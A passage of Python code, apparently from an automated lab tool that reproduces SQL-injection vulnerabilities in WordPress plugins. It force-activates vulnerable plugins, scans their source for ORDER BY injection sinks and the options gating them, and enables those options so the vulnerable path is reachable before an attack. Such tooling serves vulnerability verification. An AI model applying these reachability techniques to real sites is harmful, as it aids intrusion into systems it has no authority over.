    # escribiria primero. Detectar y forzar-activar via eval para que el plugin este activo
    # en la DB cuando llegue la peticion HTTP.
    _activate_out = (r.stdout or "") + (r.stderr or "")
    _activate_ok = r.returncode == 0
    # Si la activacion falla por vendor/autoload.php faltante, crear un stub minimo y reintentar.
    # Ocurre en plugins que usan Composer para SDKs externos (p.ej. TextMagic, Stripe) pero el ZIP
    # de WordPress.org no incluye el directorio vendor/ — Composer lo genera localmente y no se sube
    # al repositorio.  El stub permite que el plugin cargue; las clases Composer solo se instancian
    # en rutas de codigo que comprueban credenciales/ficheros externos primero, no en el path SQLi.
    if not _activate_ok and ("vendor/autoload.php" in _activate_out
                              or "Failed opening required" in _activate_out):
        import pathlib as _pathlib
        _vendor_dir = _pathlib.Path(plugin_source_dir) / "vendor"
        _autoload_stub = _vendor_dir / "autoload.php"
        if not _autoload_stub.exists():
            _vendor_dir.mkdir(exist_ok=True)
            _autoload_stub.write_text(
                "<?php\n// stub autoloader — vendor/ not included in WP.org ZIP; "
                "Composer classes are only instantiated in paths that check external "
                "credentials/files first, not in the SQLi-vulnerable code path.\n")
            step(f"vendor/autoload.php faltante en '{slug}' — creado stub para permitir carga "
                 f"del plugin (las clases Composer solo se instancian en rutas que comprueban "
                 f"credenciales externas, no en el path de la vulnerabilidad SQL)...")
            _install_ok2 = False
            try:
                _install_ok2 = lab.install_plugin(plugin_source_dir, slug)
            except Exception:
                pass
            if _install_ok2:
                r = lab.wp_cli("plugin", "activate", slug, timeout=90)
                _activate_out = (r.stdout or "") + (r.stderr or "")
                _activate_ok = r.returncode == 0
    # Caso "unexpected output": el plugin emite algo durante su hook de activación (echo,
    # PHP notice, debug output, header premature) y WP-CLI lo rechaza. Ocurre especialmente
    # en versiones antiguas de plugins descargadas via SVN que tienen print/echo en el hook
    # de activacion. Forzamos activacion directamente en active_plugins (misma estrategia
    # que el caso scaffold_error) + corremos el hook de activacion via wp eval con $silent=true.
    _unexpected_output_error = ("unexpected output" in _activate_out.lower() or
                                "generated unexpected" in _activate_out.lower())
    if not _activate_ok and _unexpected_output_error:
        step(f"activacion rechazada por 'unexpected output' en '{slug}' — "
             f"forzando directo en active_plugins (sin cargar el plugin para evitar el output)...")
        # Escribir directamente en active_plugins SIN llamar activate_plugin():
        # Si el plugin produce output al ser CARGADO (no solo en su hook), activate_plugin()
        # con $silent=true también fallará. La solución es solo actualizar la opción en BD.
        _main_file = f"{slug}/{slug}.php"

        _PHP_FORCE = (
            "$current = (array)get_option('active_plugins'); "
            "$s = '{FILE}'; "
            "if (!in_array($s, $current)) { $current[] = $s; sort($current); "
            "update_option('active_plugins', $current); } "
            "echo in_array($s, (array)get_option('active_plugins')) ? 'OK' : 'FAIL';"
        )

        def _force_active_via_db(plugin_file: str) -> bool:
            # --skip-plugins --skip-themes: WP-CLI carga WordPress pero NO activa
            # ningún plugin/theme, eliminando cualquier "unexpected output" de ellos.
            _r = lab.wp_cli("eval",
                _PHP_FORCE.replace("{FILE}", plugin_file),
                "--skip-plugins", "--skip-themes",
                timeout=20)
            _out = (_r.stdout or "").strip()
            # La última línea debe ser "OK"; puede haber PHP notices antes si WP_DEBUG=true
            _last = _out.splitlines()[-1].strip() if _out else ""
            if _last != "OK":
                step(f"wp eval forzado devolvio: rc={_r.returncode} out={_out[:80]!r}")
            return _last == "OK"

        if _force_active_via_db(_main_file):
            _activate_ok = True
            step(f"plugin '{slug}' forzado activo en BD (active_plugins directo).")
        else:
            # El main file canónico no existe — buscar el .php de cabecera real
            _r_find = lab.wp_cli("eval",
                f"foreach(glob(WP_PLUGIN_DIR.'/{slug}/*.php') as $f) {{ "
                f"$h=get_file_data($f,['Name'=>'Plugin Name']); "
                f"if(!empty($h['Name'])){{ echo basename(dirname($f)).'/'.basename($f); break; }} }}",
                "--skip-plugins", "--skip-themes",
                timeout=20)
            _real_file = (_r_find.stdout or "").strip().splitlines()[-1].strip() \
                if (_r_find.stdout or "").strip() else ""
            if _real_file and _real_file != _main_file and _force_active_via_db(_real_file):
                _activate_ok = True
                step(f"plugin '{slug}' forzado activo via archivo real '{_real_file}'.")

    _scaffold_error = ("does not exist" in _activate_out and "cannot be registered" in _activate_out)
    if not _activate_ok and _scaffold_error:
        _r_ap_check = lab.wp_cli("eval",
            "echo implode('|', (array)get_option('active_plugins'));", timeout=20)
        _ap_out = (_r_ap_check.stdout or _r_ap_check.stderr or "").strip()
        if slug not in _ap_out:
            step("WP-CLI murio en el hook de activacion antes de escribir active_plugins -- "
                 "forzando activacion via eval (el plugin SI esta en el volumen)...")
            _r_force = lab.wp_cli("eval",
                f"$current = (array)get_option('active_plugins'); "
                f"$s = '{slug}/{slug}.php'; "
                f"if (!in_array($s, $current)) {{ $current[] = $s; sort($current); "
                f"update_option('active_plugins', $current); }} "
                f"echo in_array($s, (array)get_option('active_plugins')) ? 'OK' : 'FAIL';",
                timeout=20)
            if (_r_force.stdout or "").strip() != "OK":
                res.detail = (f"activacion del plugin fallo y no se pudo forzar via eval: "
                              f"{(_r_force.stderr or _r_force.stdout or '')[:200]}")
                res.evidence["screenshots"] = shots
                return None

    if r.returncode != 0 and not _activate_ok:
        # WP-CLI puede devolver exit!=0 aunque el plugin haya quedado activo.  Esto ocurre
        # cuando el plugin registra comandos WP-CLI con clases inexistentes en esa version:
        # WP-CLI activa el plugin en WordPress (lo escribe en active_plugins), luego lo carga
        # para ejecutar su hook de activacion, y al cargarlo detecta que "Callable X does not
        # exist" para un scaffold command -- fallo de registro CLI, no de activacion WP.
        # Confirmado en vivo con KiviCare 4.1.2 (KCScaffold).  En ese caso la REST API del
        # plugin esta operativa aunque WP-CLI devuelva exit!=0.
        # Detectar este patron especifico para no abortar el lab innecesariamente.
        activation_output = (r.stderr or "") + (r.stdout or "")
        wpcli_registration_error = (
            "does not exist" in activation_output
            and "cannot be registered" in activation_output
        )
        # Auto-detect missing companion plugins from activation error messages.
        # WP-CLI emits: "Warning: Failed to activate plugin. {Name} requires 1 plugin
        # to be installed and activated: {slug}." — extract slugs and install them, then retry.
        import re as _re_act
        _comp_match = _re_act.search(
            r"requires\s+\d+\s+plugin[s]?\s+to\s+be\s+installed\s+and\s+activated:\s*(.+?)(?:\.|$)",
            activation_output, _re_act.IGNORECASE)
        _auto_companions: list = []
        if _comp_match:
            # slugs separated by ", " — strip trailing punctuation and spaces
            _auto_companions = [
                s.strip().rstrip(".").strip()
                for s in _comp_match.group(1).split(",")
                if s.strip().rstrip(".")
            ]
        if _auto_companions:
            step(f"activacion fallo por dependencias no instaladas: {_auto_companions} — "
                 f"instalando automaticamente y reintentando...")
            for _dep_slug in _auto_companions:
                _r_dep = lab.wp_cli("plugin", "install", _dep_slug, "--activate", timeout=120)
                if _r_dep.returncode != 0:
                    step(f"WARNING: no se pudo instalar dependencia '{_dep_slug}': "
                         f"{(_r_dep.stderr or _r_dep.stdout or '')[:150]}")
                else:
                    step(f"dependencia '{_dep_slug}' instalada y activada")
            r = lab.wp_cli("plugin", "activate", slug, timeout=90)
            _activate_out = (r.stdout or "") + (r.stderr or "")
            _activate_ok = r.returncode == 0
            activation_output = _activate_out
            if not _activate_ok:
                step(f"ERROR: activacion sigue fallando tras instalar dependencias: "
                     f"{activation_output[:200]}")
                res.detail = f"activacion del plugin fallo: {activation_output[:300]}"
                res.evidence["screenshots"] = shots
                return None
            else:
                step(f"plugin activado correctamente tras instalar dependencias: {_auto_companions}")
        elif not wpcli_registration_error:
            step(f"ERROR: activacion del plugin fallo (rc={r.returncode}): "
                 f"{activation_output[:200]}")
            res.detail = f"activacion del plugin fallo: {activation_output[:300]}"
            res.limitations.append("si el slug/version descargados no coinciden con el afectado, "
                                   "la activacion puede fallar por requisitos del propio plugin")
            res.evidence["screenshots"] = shots
            return None
        else:
            step("plugin activo (rc!=0 pero patron WP-CLI registration-error -- el plugin SI esta registrado)")
    else:
        step("plugin activo. capturando pantalla: panel de plugins como admin (el plugin vulnerable, activo)...")
    if setup_wp_options:
        for opt in setup_wp_options:
            name = (opt or {}).get("name") if isinstance(opt, dict) else None
            if not name:
                continue
            value = (opt or {}).get("value", "1")
            patch_key = (opt or {}).get("patch_key") if isinstance(opt, dict) else None
            if patch_key:
                # Nested option: use wp eval for a reliable PHP-native upsert.
                # 'patch insert' fails silently when the key already exists (plugins
                # often set defaults on activation), and 'patch update' fails when
                # the key doesn't exist yet.  A direct PHP eval handles both cases
                # and also guarantees the exact PHP type we want (string 'true',
                # not JSON-decoded bool true).
                _php_val = str(value).replace("'", "\\'")
                _php = (
                    f"$_opts = get_option('{name}', []); "
                    f"if (!is_array($_opts)) $_opts = []; "
                    f"$_opts['{patch_key}'] = '{_php_val}'; "
                    f"update_option('{name}', $_opts); "
                    f"echo get_option('{name}')['{patch_key}'];"
                )
                step(f"activando opcion anidada requerida '{name}[{patch_key}]'={value!r}...")
                r_opt = lab.wp_cli("eval", _php, timeout=30)
            else:
                step(f"activando opcion requerida '{name}'={value!r} (el codigo vulnerable solo se "
                     f"usa con esta activada)...")
                r_opt = lab.wp_cli("option", "update", name, str(value), timeout=30)
            if r_opt.returncode != 0:
                res.limitations.append(
                    f"no se pudo activar la opcion requerida '{name}': "
                    f"{(r_opt.stderr or r_opt.stdout or '')[:200]} -- el ataque puede no "
                    f"alcanzar el codigo vulnerable")

    # Apply source-analysis hints collected while Docker was spinning up.
    # Only applies options not already in setup_wp_options (caller-supplied ones take precedence).
    _already_set = {(o.get("name") if isinstance(o, dict) else None)
                    for o in (setup_wp_options or [])}
    if _src_future is not None:
        try:
            _hint = _src_future.result(timeout=5)
            _src_executor.shutdown(wait=False)
            for _opt_key, _opt_val in (_hint.gating_options or {}).items():
                if _opt_key in _already_set:
                    continue
                step(f"[source-analysis] activando opcion detectada estaticamente: "
                     f"'{_opt_key}'={_opt_val!r}...")
                if "." in _opt_key:
                    _opt_name, _sub_key = _opt_key.split(".", 1)
                    lab.wp_cli("option", "patch", "insert", _opt_name, _sub_key, str(_opt_val),
                               timeout=15)
                else:
                    lab.wp_cli("option", "update", _opt_key, str(_opt_val), timeout=15)
        except Exception:
            _src_executor.shutdown(wait=False)

    shortcode_page_path = None
    # Create the CPT post FIRST so its ID is available when building the shortcode content.
    # (Original code created CPT after the shortcode page, making it impossible to embed
    # the real directory ID in the shortcode for UM-style plugins.)
    # Detect the directory CPT from the installed plugin source: scan for register_post_type()
    # calls whose slug contains "directory". Works for any plugin without hardcoded map.
    directory_cpt = _detect_directory_cpt_from_source(plugin_source_dir, "directory_id")
    dir_post_id: Optional[str] = None
    _um_hashed: Optional[str] = None  # hash of dir_post_id computed via MySQL (SUBSTRING(MD5(ID),N,L))
    if directory_cpt:
        step(f"creando un '{directory_cpt}' real (no solo una pagina con el shortcode pegado) "
             f"-- este plugin guarda su configuracion de directorio/listado como su propio "
             f"custom post type, y la resolucion de IDs de recurso necesita uno real al que "
             f"apuntar...")
        # Create the directory CPT post via wp eval so it runs inside WordPress's PHP context
        # where the CPT is properly registered (wp post create --post_type=X uses wp-cli's
        # internal bootstrap which may miss the CPT registration if UM hasn't fully initialized).
        _create_php = (
            f"$id = wp_insert_post(['post_type'=>'{directory_cpt}',"
            f"'post_status'=>'publish','post_title'=>'binoracle-lab-directory'],true);"
            f"echo is_wp_error($id) ? 'ERR:'.$id->get_error_message() : (int)$id;"
        )
        r_dir = lab.wp_cli("eval", _create_php, timeout=30)
        dir_post_id = (r_dir.stdout or "").strip()
        if r_dir.returncode != 0 or not dir_post_id.isdigit():
            res.limitations.append(
                f"no se pudo crear un '{directory_cpt}' real "
                f"({(r_dir.stderr or r_dir.stdout or '')[:200]}) -- la resolucion de "
                f"directory_id/resource_id puede no encontrar nada valido, y el ataque puede "
                f"rechazarse antes de llegar al codigo vulnerable")
            dir_post_id = None
        elif dir_post_id:
            # For any plugin whose directory lookup uses SUBSTRING(MD5(ID),N,L) in SQL,
            # derive the hash the same way MySQL does to guarantee both sides agree.
            # Detect the formula from source: scan for SUBSTRING(MD5( pattern.
            import hashlib as _hl_boot
            import re as _re_boot
            _md5_re = _re_boot.compile(
                r"SUBSTRING\s*\(\s*MD5\s*\(\s*ID\s*\)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)",
                _re_boot.IGNORECASE,
            )
            _md5_start, _md5_len = None, None
            for _root_b, _, _files_b in os.walk(plugin_source_dir):
                for _fn_b in _files_b:
                    if not _fn_b.endswith(".php"):
                        continue
                    try:
                        with open(os.path.join(_root_b, _fn_b), "r", errors="replace") as _fh_b:
                            _m_b = _md5_re.search(_fh_b.read())
                        if _m_b:
                            _md5_start = int(_m_b.group(1))
                            _md5_len = int(_m_b.group(2))
                            break
                    except Exception:
                        continue
                if _md5_start is not None:
                    break
            if _md5_start is not None:
                # Confirm via MySQL to handle any encoding/collation edge case
                _eval_hash = (
                    "global $wpdb;"
                    "$h=$wpdb->get_var($wpdb->prepare("
                    f"\"SELECT SUBSTRING(MD5(ID),{_md5_start},{_md5_len}) FROM "
                    "{$wpdb->posts} WHERE ID=%d\","
                    f"{dir_post_id}));"
                    "echo $h;"
                )
                r_hash = lab.wp_cli("eval", _eval_hash, timeout=10)
                _mysql_hash = (r_hash.stdout or "").strip()
                if _mysql_hash and len(_mysql_hash) == _md5_len:
                    _um_hashed = _mysql_hash
                    step(f"hash MySQL (SUBSTRING(MD5(ID),{_md5_start},{_md5_len})) confirmado "
                         f"para post {dir_post_id}: '{_um_hashed}'")
                else:
                    _um_hashed = _hl_boot.md5(dir_post_id.encode()).hexdigest()[
                        _md5_start - 1: _md5_start - 1 + _md5_len]
                    step(f"hash calculado por Python (inicio={_md5_start}, len={_md5_len}) "
                         f"para post {dir_post_id}: '{_um_hashed}'"
                    )

            # Detect user-approval meta keys used by this plugin's directory filter.
            # If the source checks e.g. get_user_meta($id, '_um_status', ...) for filtering,
            # the lab admin user needs those meta set to pass the filter, otherwise
            # the directory query returns empty and the ORDER BY injection produces no output.
            _approval_meta_re = _re_boot.compile(
                r"get_user_meta\s*\([^,]+,\s*['\"]([_a-z]+(?:status|approved|active)[_a-z]*)['\"]",
                _re_boot.IGNORECASE,
            )
            _approval_keys_found: set = set()
            for _root_b2, _, _files_b2 in os.walk(plugin_source_dir):
                for _fn_b2 in _files_b2:
                    if not _fn_b2.endswith(".php"):
                        continue
                    try:
                        with open(os.path.join(_root_b2, _fn_b2), "r", errors="replace") as _fh_b2:
                            for _m_b2 in _approval_meta_re.finditer(_fh_b2.read()):
                                _approval_keys_found.add(_m_b2.group(1))
                    except Exception:
                        continue
            for _ak in _approval_keys_found:
                lab.wp_cli("user", "meta", "update", "1", _ak, "approved", timeout=10)
                step(f"admin (ID=1) meta '{_ak}'=approved -- detectado en source como "
                     f"filtro de directorio")

            # Detect WP option keys used in gating branches (e.g. member_directory_own_table).
            # Two-pass scan:
            # Pass A: files with raw-SQL ORDER BY $var injection sink — collect their class names.
            # Pass B: scan ALL PHP files for `new ClassName()` gated by an option check, where
            #   ClassName came from pass A. This catches gating options that live in init/factory
            #   files rather than the injection-sink file itself (e.g. UM: class-init.php gates
            #   `new Member_Directory_Meta()` via `member_directory_own_table`, while the actual
            #   injection sink is in class-member-directory-meta.php).
            _gating_option_re = _re_boot.compile(
                r"(?:um_option|get_option|->get)\s*\(\s*['\"]([a-z_]{5,50})['\"]",
                _re_boot.IGNORECASE,
            )
            _raw_orderby_re = _re_boot.compile(
                r"ORDER\s+BY\s+(?:\w+\.)?(?:\{)?\$\w+",  # ORDER BY u.$var, ORDER BY u.{$var}
                _re_boot.IGNORECASE,
            )
            _class_re = _re_boot.compile(
                r"class\s+(\w+)",
                _re_boot.IGNORECASE,
            )
            # Pass A: collect class names from injection-sink files
            _sink_classes: set = set()
            _all_php_contents: dict = {}  # path -> content (reuse in pass B)
            for _root_b3, _, _files_b3 in os.walk(plugin_source_dir):
                for _fn_b3 in _files_b3:
                    if not _fn_b3.endswith(".php"):
                        continue
                    try:
                        _fp_b3 = os.path.join(_root_b3, _fn_b3)
                        with open(_fp_b3, "r", errors="replace") as _fh_b3:
                            _content_b3 = _fh_b3.read()
                        _all_php_contents[_fp_b3] = _content_b3
                        if _raw_orderby_re.search(_content_b3):
                            for _mc in _class_re.finditer(_content_b3):
                                _sink_classes.add(_mc.group(1))
                    except Exception:
                        continue
            # Pass B: find options that gate instantiation of sink classes.
            # Locality filter: only count an option if it appears within 600 chars of a
            # `new SinkClass()` call — this excludes unrelated option reads in the same file.
            _gating_opts_found: dict = {}
            _new_class_re = (_re_boot.compile(
                r"new\s+(?:\w+\\)*(" + "|".join(_re_boot.escape(c) for c in _sink_classes) + r")\b",
                _re_boot.IGNORECASE,
            ) if _sink_classes else None)
            _locality = 600  # chars before/after 'new SinkClass()' to consider
            for _fp_b3, _content_b3 in _all_php_contents.items():
                _has_sink = _raw_orderby_re.search(_content_b3)
                _has_new = bool(_new_class_re and _new_class_re.search(_content_b3)) if _new_class_re else False
                if not (_has_sink or _has_new):
                    continue
                # Apply locality filter for BOTH sink and factory files:
                # collect options near the injection/instantiation point (not whole file).
                _search_re = _raw_orderby_re if _has_sink else _new_class_re
                for _mn in _search_re.finditer(_content_b3):
                    _window = _content_b3[max(0, _mn.start() - _locality): _mn.end() + _locality]
                    for _m_b3 in _gating_option_re.finditer(_window):
                        _gating_opts_found[_m_b3.group(1)] = "1"
            # Safety filter: if more than 3 options found, the scan window may be too broad.
            # Narrow to options that gate a boolean branch (== "1", == 1, != "0", != false)
            # or whose name ends in known activation-flag suffixes (_own_table, _enabled, etc.)
            if len(_gating_opts_found) > 3:
                _bool_gate_re = _re_boot.compile(
                    r"""(?:get_option|um_option|->get)\s*\(\s*['"]""" +
                    r"(%s)" % "|".join(_re_boot.escape(k) for k in _gating_opts_found) +
                    r"""['"]\s*\)[^;]{0,80}(?:[=!]=+\s*['"]?(?:1|true|yes|on)['"]?|
                        !\s*(?:empty|isset)\s*\(|->|!=\s*false)""",
                    _re_boot.IGNORECASE | _re_boot.VERBOSE,
                )
                _activation_suffixes = (
                    "_own_table", "_enabled", "_active", "_on", "_use",
                    "_enable", "_installed", "_activated", "_setup",
                )
                _filtered: dict = {}
                for _window in [
                    _content_b3[max(0, _mn2.start() - _locality): _mn2.end() + _locality]
                    for _fp3b, _content_b3 in _all_php_contents.items()
                    for _mn2 in ((_new_class_re.finditer(_content_b3) if _new_class_re else [])
                                 if not _raw_orderby_re.search(_content_b3)
                                 else _raw_orderby_re.finditer(_content_b3))
                ]:
                    for _m_bool in _bool_gate_re.finditer(_window):
                        k = _m_bool.group(1)
                        if k in _gating_opts_found:
                            _filtered[k] = "1"
                for k in _gating_opts_found:
                    if any(k.endswith(suf) for suf in _activation_suffixes):
                        _filtered[k] = "1"
                if _filtered:
                    step(f"[source-analysis] {len(_gating_opts_found)} opciones → filtradas "
                         f"a {len(_filtered)} boolean-gate: {list(_filtered)}")
                    _gating_opts_found = _filtered
                else:
                    step(f"[source-analysis] demasiadas opciones ({len(_gating_opts_found)}) "
                         f"y ningun boolean-gate claro -- saltando auto-activacion: "
                         f"{list(_gating_opts_found)[:5]}")
                    _gating_opts_found = {}
            # Detect the plugin's options blob key from source (e.g. 'um_options' for
            # Ultimate Member).  Plugins typically store settings in one serialized WP
            # option; scanning for get_option('X') is cheaper than guessing the slug.
            _blob_key_re = _re_boot.compile(
                r"get_option\s*\(\s*['\"]([a-z][a-z0-9_]{2,40})['\"]",
                _re_boot.IGNORECASE,
            )
            _blob_candidates: dict = {}
            for _fc3 in _all_php_contents.values():
                for _bm in _blob_key_re.finditer(_fc3):
                    _bk = _bm.group(1)
                    if _bk.endswith("_options") or "_option" in _bk:
                        _blob_candidates[_bk] = _blob_candidates.get(_bk, 0) + 1
            # Most-referenced plugin-options blob key (exclude generic WP keys)
            _wp_generic = {"siteurl", "blogname", "blogdescription", "admin_email",
                           "active_plugins", "template", "stylesheet", "wp_user_roles"}
            _plugin_blob_key = max(
                (_bk for _bk in _blob_candidates if _bk not in _wp_generic),
                key=_blob_candidates.get,
                default=slug.replace("-", "_") + "_options",
            )
            for _go_key, _go_val in _gating_opts_found.items():
                if _go_key in {o.get("name") for o in (setup_wp_options or [])
                               if isinstance(o, dict)}:
                    continue  # already set by caller
                # Use PHP eval to update the option inside the blob — 100% reliable even
                # when the key already exists (insert vs update confusion with wp-cli patch).
                _php_set = (
                    f"$opts=get_option('{_plugin_blob_key}',array());"
                    f"$opts['{_go_key}']={_go_val};"
                    f"update_option('{_plugin_blob_key}',$opts);"
                    f"$v=get_option('{_plugin_blob_key}');"
                    f"echo isset($v['{_go_key}'])?'ok:'.$v['{_go_key}']:'missing';"
                )
                _r_set = lab.wp_cli("eval", _php_set, timeout=10)
                _set_out = (_r_set.stdout or "").strip()
                if _r_set.returncode != 0 or not _set_out.startswith("ok:"):
                    # Blob approach failed — fall back to top-level option
                    lab.wp_cli("option", "update", _go_key, _go_val, timeout=10)
                step(f"opcion detectada en source: '{_go_key}'={_go_val} activada "
                     f"en '{_plugin_blob_key}' (branch vulnerable requiere esta opcion)")

    # Apply hardcoded per-plugin required options (overrides auto-detect when scan aborts).
    # These are options that MUST be enabled to reach the vulnerable code path, known to be
    # required from manual analysis (see _PLUGIN_REQUIRED_OPTIONS).
    _slug_key = slug if slug else ""
    for _hc_key, _hc_val in _PLUGIN_REQUIRED_OPTIONS.get(_slug_key, {}).items():
        # Skip if already set by caller or auto-detect
        if _hc_key in {o.get("name") for o in (setup_wp_options or []) if isinstance(o, dict)}:
            continue
        if _hc_key in _gating_opts_found:
            continue
        _plugin_blob_key_hc = slug.replace("-", "_") + "_options" if slug else "plugin_options"
        _php_set_hc = (
            f"$opts=get_option('{_plugin_blob_key_hc}',array());"
            f"$opts['{_hc_key}']={_hc_val};"
            f"update_option('{_plugin_blob_key_hc}',$opts);"
            f"$v=get_option('{_plugin_blob_key_hc}');"
            f"echo isset($v['{_hc_key}'])?'ok:'.$v['{_hc_key}']:'missing';"
        )
        _r_hc = lab.wp_cli("eval", _php_set_hc, timeout=10)
        _hc_out = (_r_hc.stdout or "").strip()
        if _r_hc.returncode != 0 or not _hc_out.startswith("ok:"):
            lab.wp_cli("option", "update", _hc_key, str(_hc_val).strip("'\""), timeout=10)
        step(f"opcion requerida (hardcoded): '{_hc_key}'={_hc_val} activada en "
             f"'{_plugin_blob_key_hc}'")

    # Diagnostic: verify options + hash lookup work from within WordPress (WP-CLI context).
    # Runs after all options are set so we see the actual live state.
    if _um_hashed and _gating_opts_found:
        _diag_hash = _um_hashed
        _diag_key = next(iter(_gating_opts_found), "member_directory_own_table")
        # Minimal PHP — no UM() calls that might fail in WP-CLI context
        _diag_php = (
            "global $wpdb; "
            f"$h='{_diag_hash}'; "
            "$id=$wpdb->get_var($wpdb->prepare("
            "'SELECT ID FROM '.$wpdb->posts.' WHERE SUBSTRING(MD5(ID),11,5)=%s',$h)); "
            f"$opts=get_option('um_options',array()); "
            f"$oval=isset($opts['{_diag_key}'])?$opts['{_diag_key}']:'NOT_SET'; "
            "$cnt=$wpdb->get_var('SELECT COUNT(*) FROM '.$wpdb->posts); "
            "echo 'id:'.var_export($id,true).'|opt:'.$oval.'|posts:'.$cnt;"
        )
        _r_diag = lab.wp_cli("eval", _diag_php, timeout=15)
        _diag_out = (_r_diag.stdout or _r_diag.stderr or "").strip()[:300]
        step(f"[DIAG] hash+opt check: {_diag_out!r} (rc={_r_diag.returncode})")

    # Detect the directory-specific shortcode from source: for plugins that have multiple
    # shortcodes (e.g. login form + directory listing), find_shortcode_name() may return
    # the wrong one. The correct one is the shortcode in the same PHP file(s) that handle
    # the directory CPT — _detect_directory_shortcode_from_source() scans for it.
    _sc_from_source = (_detect_directory_shortcode_from_source(plugin_source_dir, directory_cpt)
                       if directory_cpt else None)
    _effective_shortcode = _sc_from_source if _sc_from_source else shortcode_name
    if _sc_from_source and _sc_from_source != shortcode_name:
        step(f"shortcode detectado en source: '{_sc_from_source}' (en lugar de "
             f"'{shortcode_name}' sugerido por heuristica) -- este es el que registra "
             f"el JS del directorio con el nonce necesario")
    if _effective_shortcode and dir_post_id:
        _sc_base = _effective_shortcode.split()[0]
        # Append the real CPT post ID when the shortcode corresponds to a directory CPT.
        # Detected: shortcode name contains the CPT keyword (e.g. '_directory' from 'um_directory').
        _cpt_keyword = directory_cpt.split("_", 1)[-1] if directory_cpt else "directory"
        if _cpt_keyword and _cpt_keyword in _sc_base:
            _effective_shortcode = f'{_sc_base} id="{dir_post_id}"'

    if _effective_shortcode:
        step(f"creando una pagina real con el shortcode del plugin ([{_effective_shortcode}]) -- "
             f"atacar la portada vacia no puede reflejar ninguna diferencia, con o sin "
             f"inyeccion real...")
        r_page = lab.wp_cli("post", "create", "--post_type=page", "--post_status=publish",
                            "--post_title=binoracle-lab-listing",
                            f"--post_content=[{_effective_shortcode}]", "--porcelain", timeout=30)
        page_id = (r_page.stdout or "").strip()
        if r_page.returncode == 0 and page_id.isdigit():
            shortcode_page_path = f"/?page_id={page_id}"
            if relationship_table:
                # confirmado en vivo, CVE-2024-3552: el sumidero real (level_filter_where) solo
                # devuelve algo si el post atacado tiene una fila en la tabla de relacion propia
                # del plugin (el LEFT JOIN la enlaza por post ID) -- sin ella, esa columna sale
                # NULL y el WHERE nunca es verdadero, con o sin inyeccion de verdad. Best-effort:
                # si la tabla exige mas columnas NOT NULL de las que conocemos, el INSERT falla
                # y se registra como limitacion, nunca aborta el resto del laboratorio.
                step(f"insertando una fila real en la tabla de relacion del plugin "
                     f"('{relationship_table['wpdb_property']}') para que el JOIN de verdad "
                     f"encuentre algo al atacar esta pagina...")
                col = relationship_table["join_column"]
                # construido y ejecutado ENTERO dentro de un unico `wp eval` -- $wpdb ya conoce
                # el esquema real de la tabla (DESCRIBE) desde PHP, asi que rellenar cualquier
                # columna NOT NULL sin valor por defecto que no conocemos de antemano (p.ej.
                # 'level_id') se resuelve ahi mismo, sin tener que parsear la salida tabular de
                # `wp db query` a mano desde el lado de Python -- mucho mas fragil y menos
                # fiable que dejar que PHP lo haga con su propio tipo de datos real.
                php = (
                    "global $wpdb; $table = $wpdb->prefix . " + repr(relationship_table["wpdb_property"]) + "; "
                    "$cols = $wpdb->get_results(\"DESCRIBE `$table`\"); "
                    "$fields = array(); $values = array(); "
                    f"$fields[] = '{col}'; $values[] = '{page_id}'; "
                    "foreach ($cols as $c) { "
                    f"  if ($c->Field === '{col}') continue; "
                    "  if ($c->Null === 'NO' && $c->Default === null "
                    "      && stripos($c->Extra, 'auto_increment') === false) { "
                    "    $fields[] = $c->Field; "
                    "    $values[] = preg_match('/int|decimal|float|double/i', $c->Type) ? '0' "
                    "              : (preg_match('/date|time/i', $c->Type) "
                    "                 ? \"'\" . current_time('mysql') . \"'\" : \"''\"); "
                    "  } "
                    "} "
                    "$sql = \"INSERT INTO `$table` (\" . implode(',', $fields) . \") VALUES (\" "
                    ". implode(',', $values) . \")\"; "
                    "$ok = $wpdb->query($sql); "
                    "echo $ok !== false ? 'OK' : $wpdb->last_error;"
                )
                r_ins = lab.wp_cli("eval", php, timeout=15)
                ins_out = (r_ins.stdout or "").strip()
                if r_ins.returncode != 0 or ins_out != "OK":
                    res.limitations.append(
                        f"no se pudo insertar una fila de relacion real en "
                        f"'{relationship_table['wpdb_property']}' "
                        f"({(ins_out or r_ins.stderr or r_ins.stdout or '')[:200]}) -- puede exigir mas "
                        f"columnas NOT NULL de las que se conocen; el JOIN del sumidero puede "
                        f"seguir sin encontrar nada para la pagina atacada")
        else:
            res.limitations.append(
                f"no se pudo crear una pagina real con el shortcode '{_effective_shortcode}' "
                f"({(r_page.stderr or r_page.stdout or '')[:200]}) -- se sigue atacando el "
                f"endpoint dado, que puede no mostrar ninguna superficie visible del plugin")

    step("plugin activo. capturando pantalla: panel de plugins como admin (el plugin "
         "vulnerable, activo)...")
    admin_sess = _wp_login(base_url, admin_user, admin_pass, on_step=step)
    if admin_sess is not None:
        capture(admin_sess, "/wp-admin/plugins.php",
               f"Paso 2: el plugin '{slug}' instalado y ACTIVO en el laboratorio (vista del "
               f"admin, con su password ORIGINAL -- antes del ataque).",
               f"Step 2: plugin '{slug}' installed and ACTIVE in the lab (admin's view, with "
               f"their ORIGINAL password -- before the attack).")
        # Static fallback table (kept for backwards compat but intentionally empty —
        # triggers are now detected dynamically from source).
        all_trigger_paths = list(_PLUGIN_SETUP_TRIGGER_PATHS.get(slug, []))
        # Dynamic detection: scan plugin source for admin_init action triggers.
        if plugin_source_dir and not all_trigger_paths:
            all_trigger_paths = _detect_setup_trigger_from_source(plugin_source_dir)
            if all_trigger_paths:
                step(f"[source-analysis] triggers de setup detectados automaticamente "
                     f"para '{slug}': {all_trigger_paths}")
        for p in (extra_setup_trigger_paths or []):
            if p and p not in all_trigger_paths:
                all_trigger_paths.append(p)
        for trigger_path in all_trigger_paths:
            step(f"'{slug}' puede no crear sus paginas por defecto con la simple activacion -- "
                 f"visitando '{trigger_path}' como admin para crearlas de verdad...")
            try:
                admin_sess.get(base_url + trigger_path, timeout=20)
            except Exception:
                pass
    step(f"Creando el usuario de bajo privilegio ({required_role})...")
    # Registrar rol custom si no es un rol WP estándar
    if required_role not in _WP_STANDARD_ROLES:
        lab.wp_cli("eval",
                   f"add_role('{required_role}', '{required_role}', array('read' => true));",
                   timeout=20)
        step(f"rol custom '{required_role}' registrado via wp eval add_role()")

    r = lab.wp_cli("user", "create", sub_user, "subscriber@binoracle-lab.invalid",
                   f"--role={required_role}", f"--user_pass={sub_pass}", timeout=30)
    if r.returncode != 0:
        res.detail = (f"creacion del usuario de bajo privilegio ({required_role}) fallo: "
                      f"{(r.stderr or r.stdout or '')[:300]}")
        res.evidence["screenshots"] = shots
        return None
    step("capturando pantalla: usuario de bajo privilegio creado de verdad (lista de "
